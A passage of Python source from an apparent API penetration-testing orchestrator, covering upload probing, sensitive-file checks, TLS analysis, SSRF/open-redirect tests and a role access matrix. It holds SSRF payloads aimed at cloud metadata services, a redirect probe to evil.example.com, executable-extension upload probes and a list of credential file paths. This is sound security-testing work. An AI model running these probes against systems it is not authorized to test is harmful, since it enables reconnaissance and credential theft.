    """Phase 19: Detect file upload endpoints in API inventory (informational)."""
    scan     = settings["scan"]
    base_url = scan["api_base_url"]
    timeout  = scan.get("timeout", 10)
    target   = _parse_target(base_url)
    root     = f"{target['scheme']}://{target['netloc']}"

    con.status("file_upload_info", "running", "Detecting file upload endpoints")

    test_sess = auth_sess if auth_sess else sess

    # Signals that an endpoint accepts file uploads
    _upload_path_re  = re.compile(r'/upload|/file|/attachment|/import|/media|/document|/image|/asset', re.I)
    _upload_field_re = re.compile(r'^(file|upload|attachment|document|image|media|data)$', re.I)
    _dangerous_ext_re = re.compile(r'\.(php|phtml|php3|php5|phar|asp|aspx|jsx|jsp|jspx|cfm|shtml)\b', re.I)
    _probe_extensions = [".txt", ".html", ".php", ".jsp", ".aspx", ".svg"]

    upload_endpoints_found = []

    # 1. Scan inventory for upload-like endpoints and body fields
    for ep in inventory:
        if _shutdown_requested:
            break
        path        = ep.get("path", "")
        method      = ep.get("method", "").upper()
        body_fields = ep.get("body_fields", []) or []
        content_type = ep.get("content_type", "")

        is_upload = False
        upload_field = None

        # Check path heuristic
        if _upload_path_re.search(path):
            is_upload = True

        # Check body fields for file-upload field names
        if not is_upload:
            for field in body_fields:
                fname = field.get("name", field) if isinstance(field, dict) else str(field)
                if _upload_field_re.match(fname):
                    is_upload   = True
                    upload_field = fname
                    break

        # Check content-type hint
        if not is_upload and "multipart" in content_type.lower():
            is_upload = True

        if not is_upload or method not in ("POST", "PUT", "PATCH"):
            continue

        upload_endpoints_found.append((ep, upload_field))
        probe_path = re.sub(r'\{[^}]+\}|:\w+', '1', path)
        ep_url     = root + probe_path

        # Informational finding — upload endpoint detected
        output.add_finding(
            phase="file_upload_info",
            title="File Upload Endpoint Detected",
            severity="INFO",
            url=ep_url,
            detail=(
                f"Endpoint {method} {path} appears to accept file uploads "
                f"{'(field: ' + upload_field + ')' if upload_field else '(path heuristic)'}. "
                "File upload endpoints should be reviewed for unrestricted file type acceptance, "
                "missing virus scanning, path traversal, and storage misconfigurations."
            ),
            evidence=f"Method: {method}, Path: {path}, Upload field: {upload_field or 'heuristic'}",
            remediation=(
                "Validate file type server-side using MIME type sniffing (not just extension). "
                "Allowlist accepted file types. Store uploads outside the web root. "
                "Scan all uploaded files for malware before serving."
            ),
            extra={"owasp": "API8:2023 Security Misconfiguration", "nist": "SI-3"},
        )
        con.log(f"[file_upload_info] Upload endpoint: {method} {ep_url}", "INFO")

        # 2. Probe accepted file types by trying multipart POST with small test files
        accepted_exts = []
        rejected_exts = []
        for ext in _probe_extensions:
            if _shutdown_requested:
                break
            fake_content = b"siphon_upload_probe"
            files = {
                (upload_field or "file"): (
                    f"siphon_probe{ext}",
                    fake_content,
                    "application/octet-stream",
                )
            }
            try:
                r = test_sess.request(
                    method, ep_url, files=files, timeout=timeout, allow_redirects=False
                )
                if r is not None and r.status_code in (200, 201, 202):
                    accepted_exts.append(ext)
                else:
                    rejected_exts.append(ext)
            except Exception:
                pass

        if accepted_exts:
            has_dangerous = any(_dangerous_ext_re.search(e) for e in accepted_exts)
            sev = "HIGH" if has_dangerous else "INFO"
            output.add_finding(
                phase="file_upload_info",
                title=(
                    "Dangerous File Extension Accepted by Upload Endpoint"
                    if has_dangerous
                    else "File Upload — Accepted File Types Identified"
                ),
                severity=sev,
                url=ep_url,
                detail=(
                    f"Upload endpoint {method} {path} accepted the following extensions: "
                    f"{', '.join(accepted_exts)}. "
                    + (
                        f"Dangerous extensions {[e for e in accepted_exts if _dangerous_ext_re.search(e)]} "
                        "may allow remote code execution if uploaded files are served."
                        if has_dangerous
                        else "Review whether all accepted types are required."
                    )
                ),
                evidence=(
                    f"Accepted: {accepted_exts}  Rejected: {rejected_exts}"
                ),
                remediation=(
                    "Implement a strict allowlist of accepted file extensions and MIME types. "
                    "Reject executable file types (.php, .jsp, .aspx, .svg with scripts) server-side. "
                    "Store uploaded files with randomized names outside the web root."
                ),
                extra={"owasp": "API8:2023 Security Misconfiguration", "nist": "SI-3"},
            )
            if has_dangerous:
                con.log(f"[file_upload_info] Dangerous ext accepted at {ep_url}: {accepted_exts}", "SUCCESS")

    # 3. Probe common upload paths not in inventory
    _common_upload_paths = [
        "/api/upload", "/api/v1/upload", "/api/v2/upload",
        "/upload", "/api/files", "/api/v1/files", "/api/attachments",
        "/api/media", "/api/images", "/api/import",
    ]
    known_paths = {ep.get("path", "") for ep in inventory}
    for cup in _common_upload_paths:
        if _shutdown_requested:
            break
        if cup in known_paths:
            continue
        cup_url = root + cup
        # Quick OPTIONS probe to check if endpoint exists
        try:
            r = test_sess.options(cup_url, timeout=timeout, allow_redirects=False)
            if r is not None and r.status_code not in (404, 405, 501):
                output.add_finding(
                    phase="file_upload_info",
                    title="Potential Undocumented Upload Endpoint Discovered",
                    severity="INFO",
                    url=cup_url,
                    detail=(
                        f"OPTIONS {cup} returned HTTP {r.status_code} — the endpoint may exist "
                        "but is not documented in the API spec/inventory. Undocumented upload "
                        "endpoints bypass normal security review."
                    ),
                    evidence=f"OPTIONS {cup_url} → HTTP {r.status_code}; Allow: {r.headers.get('Allow', 'N/A')}",
                    remediation=(
                        "Document all upload endpoints in the API spec. "
                        "Disable or remove upload endpoints that are not required."
                    ),
                    extra={"owasp": "API9:2023 Improper Inventory Management", "nist": "CM-7"},
                )
        except Exception:
            pass

    con.status("file_upload_info", "done",
               f"Found {len(upload_endpoints_found)} upload endpoint(s)")


# ---------------------------------------------------------------------------
# Phase 15: Sensitive File Exposure — API9: Improper Inventory Management
# ---------------------------------------------------------------------------

_API_SENSITIVE_FILES = [
    # CRITICAL — secrets and credentials
    ("/.env",                   "CRITICAL", ".env file exposed — may contain API keys, DB credentials, and secrets."),
    ("/.env.local",             "CRITICAL", ".env.local file exposed — environment-specific secrets."),
    ("/.env.production",        "CRITICAL", ".env.production exposed — production secrets and credentials."),
    ("/.git/HEAD",              "CRITICAL", "Git repository HEAD exposed — full source code reconstruction possible."),
    ("/.git/config",            "CRITICAL", "Git repository config exposed — may contain embedded credentials."),
    ("/settings.py",            "CRITICAL", "Django settings exposed — contains SECRET_KEY, DB passwords, and API keys."),
    ("/config/database.yml",    "CRITICAL", "Database config exposed — contains production credentials."),
    ("/database.yml",           "CRITICAL", "Rails database config exposed — contains production DB credentials."),
    ("/db.sql",                 "CRITICAL", "SQL dump exposed — full database contents including credentials."),
    ("/dump.sql",               "CRITICAL", "SQL dump exposed — full database contents including credentials."),
    ("/backup.sql",             "CRITICAL", "SQL backup exposed — full database contents."),
    # HIGH — configuration and source disclosure
    ("/config.json",            "HIGH",     "config.json exposed — may contain API keys, endpoints, and auth tokens."),
    ("/config.yaml",            "HIGH",     "config.yaml exposed — may contain secrets and connection strings."),
    ("/config.yml",             "HIGH",     "config.yml exposed — may contain secrets and connection strings."),
    ("/application.properties", "HIGH",     "Spring application.properties exposed — contains DB and API credentials."),
    ("/application.yml",        "HIGH",     "Spring application.yml exposed — contains DB and API credentials."),
    ("/web.config",             "HIGH",     "IIS web.config exposed — may contain connection strings and API keys."),
    ("/appsettings.json",       "HIGH",     "ASP.NET appsettings.json exposed — contains connection strings and secrets."),
    ("/secrets.json",           "HIGH",     "secrets.json exposed — likely contains credentials or API tokens."),
    ("/.htpasswd",              "HIGH",     ".htpasswd exposed — contains HTTP Basic Auth password hashes."),
    # MEDIUM — infrastructure and dependency metadata
    ("/docker-compose.yml",     "MEDIUM",   "docker-compose.yml exposed — service topology and potentially hardcoded secrets."),
    ("/docker-compose.yaml",    "MEDIUM",   "docker-compose.yaml exposed — service topology and potentially hardcoded secrets."),
    ("/Dockerfile",             "MEDIUM",   "Dockerfile exposed — base image, build steps, and environment config."),
    ("/kubernetes.yml",         "MEDIUM",   "Kubernetes manifest exposed — service topology and config."),
    ("/k8s.yml",                "MEDIUM",   "Kubernetes manifest exposed — service topology and config."),
    ("/swagger.json",           "MEDIUM",   "swagger.json exposed — full API schema and endpoint inventory."),
    ("/swagger.yaml",           "MEDIUM",   "swagger.yaml exposed — full API schema and endpoint inventory."),
    ("/openapi.json",           "MEDIUM",   "openapi.json exposed — full API specification."),
    ("/openapi.yaml",           "MEDIUM",   "openapi.yaml exposed — full API specification."),
    ("/api-docs",               "MEDIUM",   "API documentation exposed — full endpoint inventory."),
    ("/api/swagger.json",       "MEDIUM",   "swagger.json exposed at /api path — full API schema."),
    ("/phpinfo.php",            "MEDIUM",   "PHP info page exposed — discloses version, modules, and server paths."),
    ("/server-status",          "MEDIUM",   "Apache server-status exposed — discloses active requests and client IPs."),
    # LOW — dependency metadata
    ("/package.json",           "LOW",      "package.json exposed — Node.js dependency versions for CVE research."),
    ("/requirements.txt",       "LOW",      "requirements.txt exposed — Python dependency versions for CVE research."),
    ("/composer.json",          "LOW",      "composer.json exposed — PHP dependency versions for CVE research."),
    ("/go.mod",                 "LOW",      "go.mod exposed — Go module dependency versions for CVE research."),
    ("/Gemfile",                "LOW",      "Gemfile exposed — Ruby dependency versions for CVE research."),
    ("/pom.xml",                "LOW",      "pom.xml exposed — Java/Maven dependency versions for CVE research."),
    ("/.DS_Store",              "LOW",      ".DS_Store exposed — macOS directory structure metadata."),
]


def phase_sensitive_files(settings: dict, sess: requests.Session,
                          output: OutputManager) -> None:
    """Phase 15: Probe for sensitive files exposed at the API base URL."""
    scan = settings["scan"]
    base_url = scan["api_base_url"].rstrip("/")
    timeout = scan.get("timeout", 10)

    con.status("sensitive_files", "running", f"Probing {len(_API_SENSITIVE_FILES)} paths")

    # Detect wildcard/catch-all: validate all hits against the baseline
    _sf_wc = _detect_wildcard(base_url, sess, timeout)

    for fpath, severity, desc in _API_SENSITIVE_FILES:
        if _shutdown_requested:
            break
        try:
            resp = sess.get(base_url + fpath, timeout=timeout, allow_redirects=False)
            if resp.status_code != 200 or len(resp.text) < 5:
                continue
            if _is_wildcard_match(resp, _sf_wc):
                continue
            output.add_finding(
                phase="sensitive_files",
                title=f"Sensitive File Exposed: {fpath}",
                severity=severity,
                url=base_url + fpath,
                detail=desc + f" ({base_url + fpath} returned HTTP 200).",
                evidence=f"HTTP 200  Content excerpt: {resp.text[:300]}",
                remediation=f"Remove or restrict access to {fpath}. Ensure web server does not serve config files.",
            )
        except Exception:
            pass

    con.status("sensitive_files", "done", "Sensitive file probing complete")


# ---------------------------------------------------------------------------
# Phase 16: TLS Analysis — API8: Security Misconfiguration
# ---------------------------------------------------------------------------

def phase_tls(settings: dict, output: OutputManager) -> None:
    """Phase 16: TLS/SSL analysis using sslscan and testssl.sh."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    target = _parse_target(base_url)

    if target["scheme"] == "http":
        con.status("tls", "skip", "Target is HTTP — no TLS surface to analyse")
        return

    host = target["host"]
    port = target["port"]
    host_port = f"{host}:{port}"

    con.status("tls", "running", f"TLS analysis on {host_port}")

    sslscan = shutil.which("sslscan")
    testssl = shutil.which("testssl.sh") or shutil.which("testssl")

    if not sslscan and not testssl:
        con.warn("[tls] Neither sslscan nor testssl.sh found — install one for TLS analysis")
        con.status("tls", "skip", "No TLS tool available")
        return

    # Titles aligned with DVFastAPI/DV app expected_findings.json catalogue.
    # VULNERABLE anchor variants catch testssl's explicit "VULNERABLE" output.
    _TLS_VULN_PATTERNS = {
        "SSLv2 Protocol Supported (DROWN)":                    (re.compile(r'SSLv2\s+enabled|Accepted\s+SSLv2', re.I),           "CRITICAL"),
        "SSLv3 Protocol Supported (POODLE)":                   (re.compile(r'SSLv3\s+enabled|Accepted\s+SSLv3', re.I),           "HIGH"),
        "TLS 1.0 Protocol Supported (BEAST)":                  (re.compile(r'TLSv1\.0\s+enabled|Accepted\s+TLSv1\.0\b', re.I),  "MEDIUM"),
        "TLS 1.1 Protocol Supported (Deprecated)":             (re.compile(r'TLSv1\.1\s+enabled|Accepted\s+TLSv1\.1', re.I),    "LOW"),
        "RC4 Cipher Suite Enabled (CVE-2013-2566)":            (re.compile(r'\bRC4\b', re.I),                                    "HIGH"),
        "NULL Cipher Suite Supported":                         (re.compile(r'NULL\s+Cipher|NULL-', re.I),                        "CRITICAL"),
        "EXPORT Grade Cipher Suites Enabled (FREAK / LOGJAM)": (re.compile(r'\bEXPORT\b', re.I),                                 "HIGH"),
        "3DES / SWEET32 Cipher Suite Enabled (CVE-2016-2183)": (re.compile(r'DES-CBC3|3DES|\bSWEET32\b', re.I),                  "MEDIUM"),
        "Anonymous Cipher Suite Supported":                    (re.compile(r'\bADH\b|\bECDH-anon\b|\bANON\b', re.I),             "HIGH"),
        "Weak RSA Certificate Key (1024-bit)":                 (re.compile(r'RSA Key.*?1024|1024\s*bit.*?(?:rsa|key)|Public Key.*?1024', re.I), "HIGH"),
        "SHA-1 Certificate Signature Algorithm":               (re.compile(r'sha1WithRSA|Signature Algorithm.*SHA1\b|SHA1\s+Cert', re.I), "MEDIUM"),
        "TLS Vulnerability: Heartbleed":                       (re.compile(r'heartbleed|VULNERABLE.*heartbleed', re.I),           "CRITICAL"),
        "CRIME Vulnerability (TLS Compression Enabled)":       (re.compile(r'CRIME|VULNERABLE.*crime', re.I),                    "MEDIUM"),
        "TLS Vulnerability: DROWN":                            (re.compile(r'DROWN|VULNERABLE.*drown', re.I),                    "HIGH"),
        "TLS Vulnerability: LOGJAM":                           (re.compile(r'LOGJAM|VULNERABLE.*logjam', re.I),                  "HIGH"),
        "TLS Vulnerability: FREAK":                            (re.compile(r'FREAK|VULNERABLE.*freak', re.I),                    "HIGH"),
        "TLS Vulnerability: LUCKY13":                          (re.compile(r'lucky13', re.I),                                    "MEDIUM"),
        "Self-Signed Certificate":                             (re.compile(r'self.?signed|Self signed', re.I),                   "HIGH"),
        "Expired SSL Certificate":                             (re.compile(r'certif.*expir|expir.*certif|expired', re.I),        "MEDIUM"),
    }

    _tls_remediation = (
        "Disable deprecated TLS protocols and weak cipher suites. "
        "Use TLSv1.2+ with strong cipher suites only. "
        "Renew expired or self-signed certificates."
    )

    ran_any = False

    # ── sslscan ──────────────────────────────────────────────────────────────
    if sslscan:
        _ss_file = output.tool_path("sslscan", f"sslscan_{host}_{port}.txt")
        try:
            result = subprocess.run(
                [sslscan, "--no-colour", host_port],
                capture_output=True, text=True, timeout=60,
            )
            _ss_out = result.stdout + result.stderr
            _ss_file.write_text(_ss_out, encoding="utf-8")
            ran_any = True

            # False positive filtering (aligned with Fracture's sslscan parser):
            # 1. Lines containing "not vulnerable" — sslscan explicitly clears the check.
            # 2. Bare section-header lines: sslscan emits "  Heartbleed:" with no value
            #    before per-protocol result lines; the header alone would false-match the
            #    heartbleed pattern even when no vulnerability is present.
            _SSL_SECTION_HDR = re.compile(r'^\s+[\w ,()/-]+:\s*$')
            _ss_filtered = "\n".join(
                ln for ln in _ss_out.splitlines()
                if "not vulnerable" not in ln.lower()
                and not _SSL_SECTION_HDR.match(ln)
            )
            for _title, (pat, severity) in _TLS_VULN_PATTERNS.items():
                if pat.search(_ss_filtered):
                    _vuln = _title
                    output.add_finding(
                        phase="tls",
                        title=_title,
                        severity=severity,
                        url=base_url,
                        detail=f"{_vuln} detected on {host_port}.",
                        evidence=f"sslscan output matched pattern for: {_vuln}",
                        remediation=_tls_remediation,
                        output_file=str(_ss_file),
                        source="sslscan",
                    )
        except Exception as e:
            con.warn(f"[tls] sslscan error: {e}")

    # ── testssl.sh ────────────────────────────────────────────────────────────
    if testssl:
        _ts_file = output.tool_path("testssl", f"testssl_{host}_{port}.txt")
        try:
            result = subprocess.run(
                [testssl, "--fast", "--quiet", host_port],
                capture_output=True, text=True, timeout=120,
            )
            _ts_out = result.stdout + result.stderr
            _ts_file.write_text(_ts_out, encoding="utf-8")
            ran_any = True

            # False positive filtering (aligned with Fracture's testssl parser):
            # - "(OK)" lines: testssl marks passing checks with (OK); not a vulnerability.
            # - "Testing robust forward secrecy": section header, no finding.
            # - "User-agent:" / "Disallow:": embedded HTTP content in testssl output that
            #   can contain keywords matching cipher/protocol patterns.
            # - "not offered": cipher or protocol absent — explicitly safe.
            # - DROWN advisory continuation line contains "make sure you don't use this
            #   certificate" which itself references the word "DROWN" in context.
            _TESTSSL_NOISE = re.compile(
                r'Testing robust forward secrecy'
                r'|User-agent:'
                r'|Disallow:'
                r'|not offered'
                r'|make sure you don.t use this certificate',
                re.I,
            )
            _ts_filtered = "\n".join(
                ln for ln in _ts_out.splitlines()
                if "(OK)" not in ln and not _TESTSSL_NOISE.search(ln)
            )
            for _title, (pat, severity) in _TLS_VULN_PATTERNS.items():
                if pat.search(_ts_filtered):
                    _vuln = _title
                    output.add_finding(
                        phase="tls",
                        title=_title,
                        severity=severity,
                        url=base_url,
                        detail=f"{_vuln} detected on {host_port}.",
                        evidence=f"testssl.sh output matched pattern for: {_vuln}",
                        remediation=_tls_remediation,
                        output_file=str(_ts_file),
                        source="testssl.sh",
                    )
        except Exception as e:
            con.warn(f"[tls] testssl error: {e}")

    if not ran_any:
        con.status("tls", "skip", "TLS tool produced no output")
        return

    con.status("tls", "done", f"TLS analysis complete for {host_port}")


# ---------------------------------------------------------------------------
# Phase 16b: Unsafe Consumption of APIs (OWASP API10:2023)
# ---------------------------------------------------------------------------

_UC_WEBHOOK_PARAMS = re.compile(
    r'webhook|callback|redirect.?uri|redirect.?url|notify.?url|'
    r'return.?url|target.?url|dest.?url|ping.?url|hook', re.I
)
_UC_INTERNAL_SSRF = [
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata service"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata service"),
    ("http://127.0.0.1/", "localhost loopback"),
    ("http://localhost/", "localhost (named)"),
    ("http://192.168.1.1/", "RFC-1918 internal gateway"),
]
_UC_DESER_MARKERS = re.compile(
    r'\xac\xed\x00\x05|rO0AB|KGhv|__reduce__|__getstate__|'
    r'O:[\d]+:"[a-zA-Z]+"|a:[\d]+:\{i:', re.I
)


def phase_unsafe_consumption(settings: dict, sess: requests.Session,
                              auth_sess, output: OutputManager,
                              inventory: list) -> None:
    """Phase 16b: Unsafe Consumption of APIs — OWASP API10:2023."""
    scan     = settings["scan"]
    base_url = scan["api_base_url"]
    timeout  = scan.get("timeout", 10)
    target   = _parse_target(base_url)
    root     = f"{target['scheme']}://{target['netloc']}"

    con.status("unsafe_consumption", "running", "Webhook/callback URL injection")

    test_sess = auth_sess if auth_sess else sess

    # 1. Webhook / callback URL injection → internal SSRF
    for ep in inventory[:50]:
        if _shutdown_requested:
            break
        path   = ep["path"]
        method = ep["method"].upper()
        params = ep.get("params", []) or []
        body_fields = ep.get("body_fields", []) or []

        # Find URL-like parameters
        url_params = [
            p.get("name", p) if isinstance(p, dict) else p
            for p in params + body_fields
            if _UC_WEBHOOK_PARAMS.search(
                p.get("name", p) if isinstance(p, dict) else str(p)
            )
        ]
        if not url_params:
            continue

        probe_path = re.sub(r'\{[^}]+\}|:\w+', '1', path)
        ep_url     = root + probe_path

        for ssrf_target, ssrf_desc in _UC_INTERNAL_SSRF[:3]:
            for pname in url_params[:2]:
                payload = {pname: ssrf_target}
                try:
                    if method in ("GET", "HEAD"):
                        r = test_sess.request(method, ep_url, params=payload,
                                              timeout=timeout, allow_redirects=False)
                    else:
                        r = test_sess.request(method, ep_url, json=payload,
                                              timeout=timeout, allow_redirects=False)
                    if r and r.status_code in (200, 201):
                        output.add_finding(
                            phase="unsafe_consumption",
                            title="Unsafe API Consumption — Webhook URL Accepted (SSRF Risk)",
                            severity="HIGH",
                            url=ep_url,
                            detail=(
                                f"Endpoint {method} {path} accepted an internal URL "
                                f"({ssrf_target}) in parameter '{pname}' without rejection. "
                                f"If the server fetches this URL, it exposes the {ssrf_desc}."
                            ),
                            evidence=(
                                f"Param: {pname} = {ssrf_target}\n"
                                f"HTTP {r.status_code}"
                            ),
                            remediation=(
                                "Validate and allowlist all URLs accepted from external sources. "
                                "Block private IP ranges (10/8, 172.16/12, 192.168/16, 169.254/16) "
                                "and loopback addresses. Use a DNS rebinding-resistant validator."
                            ),
                            extra={"owasp": "API10:2023 Unsafe Consumption of APIs",
                                   "nist": "SI-10"},
                        )
                        con.log(f"[unsafe_consumption] Webhook SSRF: {ep_url} param={pname}", "SUCCESS")
                        break
                except Exception:
                    pass

    # 2. Unsafe HTTP redirect following to external resources
    con.status("unsafe_consumption", "running", "Redirect validation")
    for ep in inventory[:30]:
        if _shutdown_requested:
            break
        method = ep["method"].upper()
        if method != "GET":
            continue
        path       = ep["path"]
        probe_path = re.sub(r'\{[^}]+\}|:\w+', '1', path)
        ep_url     = root + probe_path
        params     = {"redirect": "http://evil.example.com/", "url": "http://evil.example.com/"}
        try:
            r = test_sess.get(ep_url, params=params, timeout=timeout, allow_redirects=False)
            if r and r.status_code in (301, 302, 307, 308):
                loc = r.headers.get("Location", "")
                if "evil.example.com" in loc:
                    output.add_finding(
                        phase="unsafe_consumption",
                        title="Unsafe Consumption — Open Redirect to External URL",
                        severity="MEDIUM",
                        url=ep_url,
                        detail=(
                            f"Endpoint GET {path} follows attacker-controlled redirect URL "
                            f"and returned Location: {loc}. Open redirects in APIs that "
                            f"consume external data enable phishing and SSRF chain attacks."
                        ),
                        evidence=f"GET {ep_url}?redirect=http://evil.example.com → HTTP {r.status_code} Location: {loc}",
                        remediation=(
                            "Validate all redirect targets against an allowlist. "
                            "Never reflect user-provided URLs directly in redirect responses."
                        ),
                        extra={"owasp": "API10:2023 Unsafe Consumption of APIs",
                               "nist": "SI-10"},
                    )
                    con.log(f"[unsafe_consumption] Open redirect: {ep_url}", "SUCCESS")
        except Exception:
            pass

    # 3. Deserialization markers in API responses
    con.status("unsafe_consumption", "running", "Deserialization probe")
    for ep in inventory[:20]:
        if _shutdown_requested:
            break
        if ep["method"].upper() != "GET":
            continue
        path       = ep["path"]
        probe_path = re.sub(r'\{[^}]+\}|:\w+', '1', path)
        ep_url     = root + probe_path
        try:
            r = test_sess.get(ep_url, timeout=timeout)
            if r and _UC_DESER_MARKERS.search(r.text):
                output.add_finding(
                    phase="unsafe_consumption",
                    title="Unsafe Consumption — Serialization Markers in API Response",
                    severity="MEDIUM",
                    url=ep_url,
                    detail=(
                        f"API response from {ep_url} contains serialization markers "
                        f"(Java, PHP, or Python object serialization patterns). "
                        f"Serialized data passed between services may be deserialized unsafely."
                    ),
                    evidence=f"Response body excerpt: {r.text[:300]}",
                    remediation=(
                        "Use language-agnostic data formats (JSON/Protobuf) between services. "
                        "Never deserialize untrusted data without schema validation. "
                        "Use a serialization denylist or RASP to block gadget chains."
                    ),
                    extra={"owasp": "API10:2023 Unsafe Consumption of APIs",
                           "nist": "SI-10"},
                )
                con.log(f"[unsafe_consumption] Deser markers: {ep_url}", "SUCCESS")
        except Exception:
            pass

    con.status("unsafe_consumption", "done", "Unsafe consumption testing complete")


# ---------------------------------------------------------------------------
# Phase 20: Multi-credential access matrix
# ---------------------------------------------------------------------------

def phase_access_matrix(
    settings: dict,
    output: "OutputManager",
    inventory: list,
) -> dict:
    import copy as _copy

    scan          = settings.get("scan", {})
    auth_matrix   = scan.get("auth_matrix", [])
    base_url      = scan.get("api_base_url", "").rstrip("/")
    timeout       = scan.get("timeout", 10)
    project_dir   = Path(scan.get("project", "."))

    if not inventory:
        return {}

    con.section("Phase 20: Multi-Credential Access Matrix")

    # ── Build one session per role ────────────────────────────────────────────
    role_sessions: dict = {}
    for role_cfg in auth_matrix:
        role = role_cfg.get("role") or f"role{len(role_sessions)+1}"
        r_auth = _copy.deepcopy(scan.get("auth", {}))
        r_auth["enabled"]  = True
        r_auth["username"] = role_cfg.get("username", r_auth.get("username", ""))
        r_auth["password"] = role_cfg.get("password", r_auth.get("password", ""))
        r_settings = _copy.deepcopy(settings)
        r_settings["scan"]["auth"] = r_auth
        r_sess = _build_auth_session(r_settings)
        if r_sess is None:
            r_sess = _make_session(settings)
        role_sessions[role] = r_sess
        con.info(f"  Role '{role}' → authenticated session built "
                 f"(user: {r_auth.get('username','?')})")

    # Unauthenticated session (plain requests session, no auth headers)
    unauth_sess = _make_session(settings)
    role_sessions["unauthenticated"] = unauth_sess
    all_roles   = list(role_sessions.keys())
    cred_roles  = [r for r in all_roles if r != "unauthenticated"]

    con.info(f"  Testing {len(inventory)} endpoints across {len(all_roles)} roles "
             f"({', '.join(all_roles)})")

    # ── Test each endpoint with each role ─────────────────────────────────────
    endpoint_access: list = []
    for ep in inventory:
        method = ep.get("method", "GET").upper()
        path   = ep.get("path", ep.get("url", ""))
        if path.startswith("http"):
            url = path
        else:
            url = base_url + (path if path.startswith("/") else "/" + path)

        access: dict = {}
        for role, r_sess in role_sessions.items():
            try:
                r = r_sess.request(
                    method, url, timeout=timeout,
                    allow_redirects=False,
                    headers={"Accept": "application/json"},
                )
                access[role] = r.status_code
            except Exception:
                access[role] = None

        endpoint_access.append({
            "method": method,
            "path":   path,
            "url":    url,
            "access": access,
        })

    # ── Calculate privilege counts ────────────────────────────────────────────
    def _ok(st):
        return isinstance(st, int) and st in (200, 201, 202, 204)

    privilege_counts = {
        role: sum(1 for ep in endpoint_access if _ok(ep["access"].get(role)))
        for role in all_roles
    }
    most_privileged = (
        max(cred_roles, key=lambda r: privilege_counts[r]) if cred_roles else None
    )
    con.info(f"  Most privileged role: {most_privileged or 'N/A'} "
             f"({privilege_counts.get(most_privileged, 0)} endpoints)")

    # ── Generate findings ─────────────────────────────────────────────────────
    for ep in endpoint_access:
        ep_access  = ep["access"]
        unauth_st  = ep_access.get("unauthenticated")
        any_authed = any(_ok(ep_access.get(r)) for r in cred_roles)

        # Finding 1: unauthenticated access to an endpoint that IS accessible with credentials
        # Skip diagnostic/info methods — TRACE and OPTIONS are expected to be publicly accessible
        _skip_methods = {"TRACE", "OPTIONS"}
        if _ok(unauth_st) and any_authed and ep["method"].upper() not in _skip_methods:
            output.add_finding(
                phase="access_matrix",
                title=f"Unauthenticated Access to {ep['method']} {ep['path']}",
                severity="MEDIUM",
                url=ep["url"],
                detail=(
                    f"Endpoint {ep['method']} {ep['path']} returned HTTP "
                    f"{unauth_st} without authentication, but returns 2xx "
                    f"when authenticated. This indicates missing or insufficient "
                    f"access control."
                ),
                evidence=f"URL: {ep['url']} | Unauth status: {unauth_st}",
                remediation=(
                    "Enforce authentication checks on all non-public endpoints. "
                    "Verify authorization middleware is applied globally."
                ),
                extra={
                    "owasp":   "API1:2023 Broken Object Level Authorization",
                    "nist":    "AC-3",
                    "command": f"{ep['method']} {ep['url']} (no auth)",
                },
            )

        # Finding 2: BFLA — lower-privilege role accessing endpoint exclusive to most-privileged
        if most_privileged and len(cred_roles) > 1:
            if _ok(ep_access.get(most_privileged)):
                for low_role in cred_roles:
                    if low_role == most_privileged:
                        continue
                    if _ok(ep_access.get(low_role)):
                        output.add_finding(
                            phase="access_matrix",
                            title=(
                                f"BFLA: Role '{low_role}' Can Access "
                                f"Admin Endpoint {ep['method']} {ep['path']}"
                            ),
                            severity="HIGH",
                            url=ep["url"],
                            detail=(
                                f"Role '{low_role}' (lower privilege) can access "
                                f"{ep['method']} {ep['path']} which is also accessible "
                                f"to '{most_privileged}' (most privileged role). "
                                f"No effective function-level authorization is enforced."
                            ),
                            evidence=(
                                f"URL: {ep['url']} | "
                                f"{most_privileged}: HTTP {ep_access[most_privileged]} | "
                                f"{low_role}: HTTP {ep_access[low_role]}"
                            ),
                            remediation=(
                                f"Implement role-based access control. Only allow "
                                f"'{most_privileged}' to access privileged endpoints."
                            ),
                            extra={
                                "owasp":   "API5:2023 Broken Function Level Authorization",
                                "nist":    "AC-6",
                                "command": f"{ep['method']} {ep['url']} (role: {low_role})",
                            },
                        )

    # ── Write access_matrix.json ──────────────────────────────────────────────
    access_matrix = {
        "roles":            all_roles,
        "most_privileged":  most_privileged,
        "privilege_counts": privilege_counts,
        "endpoints":        endpoint_access,
    }
    matrix_path = project_dir / "access_matrix.json"
    try:
        matrix_path.write_text(json.dumps(access_matrix, indent=2))
        con.info(f"  Access matrix saved: {matrix_path}")
    except Exception as exc:
        con.err(f"  Failed to save access_matrix.json: {exc}")

    unauth_count = sum(
        1 for ep in endpoint_access
        if _ok(ep["access"].get("unauthenticated"))
        and any(_ok(ep["access"].get(r)) for r in cred_roles)
    )
    con.info(f"  Unauthenticated access found on {unauth_count} endpoint(s)")
    return access_matrix


# ---------------------------------------------------------------------------
# main()
# ---------------------------------------------------------------------------

def main() -> None:
    _install_signal_handlers()
    _start_concurrency_monitor(_SCAN_SEM)

    args = _parse_args()

    if args.list_phases:
        print(f"\nSiphon v{VERSION} — Phase List\n")
        for name, desc in PHASE_LIST:
            print(f"  {name:<18} {desc}")
        print()
        sys.exit(0)

    if not _MANAGED:
        con.banner(BANNER)
        print(f"  Siphon — API Penetration Testing Orchestrator v{VERSION}")
        print(f"  OWASP API Security Top 10 2023\n")

    # Load and merge settings
    settings = _load_settings(args.settings)
    settings = _auto_unlock_phases(settings)
    settings = _apply_args(settings, args)
    scan = settings["scan"]

    # Auto-compute structured project path from engagement fields if not set
    if not scan.get("project"):
        eng = settings.get("engagement", {})
        scan["project"] = str(_build_project_dir(
            eng.get("client_short", ""),
            eng.get("start_date", ""),
            "siphon",
        ))

    # Build deduped URL list: primary + extras
    _primary = scan.get("api_base_url", "").rstrip("/")
    _extras  = [u.rstrip("/") for u in scan.get("api_base_urls", []) if u]
    if _primary:
        base_urls = [_primary] + [u for u in _extras if u != _primary]
    else:
        base_urls = _extras
    _seen_u: set = set()
    base_urls = [u for u in base_urls if u not in _seen_u and not _seen_u.add(u)]

    if not base_urls:
        con.err("No API base URL specified. Use --url or set scan.api_base_url in settings.")
        sys.exit(1)

    con.info(f"Target(s): {', '.join(base_urls)}")
    con.info(f"Project  : {scan['project']}")
    con.info(f"Threads  : {scan['threads']}")
    con.info(f"Timeout  : {scan['timeout']}s")
    if scan.get("proxy"):
